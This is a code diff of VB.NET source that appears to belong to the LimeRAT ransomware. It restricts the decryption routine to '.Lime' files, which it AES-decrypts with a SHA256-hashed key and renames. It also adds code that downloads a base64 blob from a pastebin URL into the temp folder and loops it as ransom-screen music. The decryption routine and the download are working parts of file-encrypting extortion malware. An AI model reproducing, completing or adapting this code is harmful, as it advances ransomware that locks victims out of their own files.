@@ -100,18 +100,20 @@ Public Class Form1
 
     Public Sub File_Dec(ByVal file As String, ByVal key As String)
         Try
-            Dim B2Dec As Byte() = IO.File.ReadAllBytes(file)
-            Dim KeyBytes As Byte() = System.Text.Encoding.UTF8.GetBytes(key)
-            KeyBytes = SHA256.Create().ComputeHash(KeyBytes)
-            Dim BytesDec As Byte() = AES_Dec(B2Dec, KeyBytes)
-            IO.File.WriteAllBytes(file, BytesDec)
-            Dim exten As String = System.IO.Path.GetExtension(file)
-            Dim result As String = file.Substring(0, file.Length - exten.Length)
-            IO.File.Move(file, result)
-            FileCount += 1
-            OK = True
-            txtFiles.AppendText("[" + FileCount.ToString + "] " + Path.GetFileName(file))
-            txtFiles.AppendText(Environment.NewLine)
+            If file.EndsWith(".Lime") Then
+                Dim B2Dec As Byte() = IO.File.ReadAllBytes(file)
+                Dim KeyBytes As Byte() = System.Text.Encoding.UTF8.GetBytes(key)
+                KeyBytes = SHA256.Create().ComputeHash(KeyBytes)
+                Dim BytesDec As Byte() = AES_Dec(B2Dec, KeyBytes)
+                IO.File.WriteAllBytes(file, BytesDec)
+                Dim exten As String = System.IO.Path.GetExtension(file)
+                Dim result As String = file.Substring(0, file.Length - exten.Length)
+                IO.File.Move(file, result)
+                FileCount += 1
+                OK = True
+                txtFiles.AppendText("[" + FileCount.ToString + "] " + Path.GetFileName(file))
+                txtFiles.AppendText(Environment.NewLine)
+            End If
         Catch ex As Exception
             txtFiles.AppendText("[Wrong Key]")
             txtFiles.AppendText(Environment.NewLine)
@@ -182,8 +184,14 @@ Public Class Form1
     Dim WithEvents Player As New WMPLib.WindowsMediaPlayer
     Private Sub BackgroundWorker4_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker4.DoWork
         Try
+            Dim FN = IO.Path.GetTempPath + "\LimeRAT-MUSIC.MP3"
+            If IO.File.Exists(FN) Then GoTo 1
+            Dim WC As New Net.WebClient
+            Dim O = WC.DownloadString("https://pastebin.com/raw/34Gqdu7K")
+            Try : IO.File.WriteAllBytes(FN, Convert.FromBase64String(O)) : Catch : End Try
+1:
             Player.settings.setMode("Loop", True)
-            Player.URL = "https://content-na.drive.amazonaws.com/v2/download/presigned/5ujSnRHmaF6f3B0VjagP_7lcSdDX-5Z051xMafyGRMUeJxFPc?download=true"
+            Player.URL = FN
         Catch ex As Exception
         End Try
     End Sub
